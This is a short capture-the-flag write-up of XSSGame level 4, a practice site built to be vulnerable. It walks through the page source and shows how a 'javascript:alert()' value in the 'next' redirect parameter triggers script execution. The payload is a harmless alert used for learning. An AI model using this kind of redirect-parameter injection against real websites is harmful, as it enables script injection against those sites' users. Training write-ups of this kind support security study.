## XSSGame Level 4 Writeup
![Image](https://github.com/user-attachments/assets/55aa7360-555c-4165-866a-bd92fa199bdf)
 


When I entered the challenge, I was directed to another page via a sign-up form, which led me to a page with an input field for an email address.

I read the source code and found the following:

```html
<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/level_style.css" />
    <script src="/static/js/js_frame.js"></script>
  </head>
  <body>
    <center>
      <img src="/static/img/googlereader-logo.png" /><br><br>
      <!-- We're ignoring the email, but the poor user will never know! -->
      Enter email: <input id="reader-email" name="email" value="">
      <br><br>
      <a href="confirm?next=welcome">Next >></a>
    </center>
  </body>
</html>
``` 

The only interesting thing was the 
`<a href="confirm?next=welcome">`  
This link would take me to the confirm page, where I found the following code: 
 

```html
<!DOCTYPE html>
<html>
  <head>
    <script src="/static/js/js_frame.js"></script>
  </head>
  <body style="background-color: white;">
    <center>
      <img src="/static/img/googlereader-logo.png" /><br><br>
      Thanks for signing up, you will be redirected soon...
      <script>
        setTimeout(function() { window.location = 'welcome'; }, 1000);
      </script>
    </center>
  </body>
</html>
``` 

The key part was the `window.location = 'welcome'` inside the `<script>`, which redirects after 1 second.


At this point, I thought: "What if I inject a malicious URL into the next parameter?" So, I modified the URL:

Original URL:

```
http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=welcome
```
Modified URL:

```
http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert()
```

When I accessed the modified URL, the JavaScript alert was triggered as expected!

![Image](https://github.com/user-attachments/assets/a85205bf-623b-4319-bb2b-788d40437d5b)
